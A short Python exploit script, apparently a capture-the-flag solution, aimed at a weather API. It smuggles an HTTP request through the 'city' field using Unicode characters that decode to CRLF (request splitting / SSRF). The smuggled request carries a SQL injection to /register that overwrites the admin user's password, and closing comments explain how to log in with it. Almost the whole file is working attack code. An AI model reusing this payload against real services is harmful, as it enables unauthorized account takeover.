import requests
url = 'http://ip/api/weather'
r = '\u010D'
n = '\u010A'
space = '\u0120'
""" "city": {"hostname": 'www.google.com',
             "port": 80,
             "path": '/',
             "method": 'POST'}, """
# Test with requestcatcher.com
# https://replit.com/languages/nodejs is a test website, carry those commented codes, thus you can see how data is parsed and which protocols are used
""" const http = require('http')

http.get(`http:\\catch.requestcatcher.com/`, res => {
				let body = '';
				res.on('data', chunk => body += chunk);
				res.on('end', () => {
					try {
						resolve(JSON.parse(body));
					} catch(e) {
						resolve(false);
					}
				});
			}) """


# This is our request for /register path that vulnerable for sql injection
payload = "username=admin&password=admin%27)%20ON%20CONFLICT(username)%20DO%20UPDATE%20SET%20password=%27pswd%27"
host = '127.0.0.1'
# https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/ is nice blog that explains how code injected to http.get method that running on server side
injection = f' HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n POST / \r\n HTTP/1.1\r\n Host: {host}\r\n Accept: */*\r\n Accept-Encoding: gzip, deflate \r\n Content-Length: {len(payload)} \r\n {payload} \r\n User-Agent: python-requests/2.26.0 \r\n Connection: keep-alive \r\n\r\nPOST /?a='.replace(
    '\r', r).replace('\n', n).replace(' ', space)
print(injection)
data = {
    "endpoint": host,
    "city": 'fake' + injection,
    "country": 'Turkey'
}
req = requests.post(url, data=data, timeout=5)
print(req.text)
print(req.headers)
print(req.status_code)
# go to /login try the credentials that you overwrite on admin user credentials
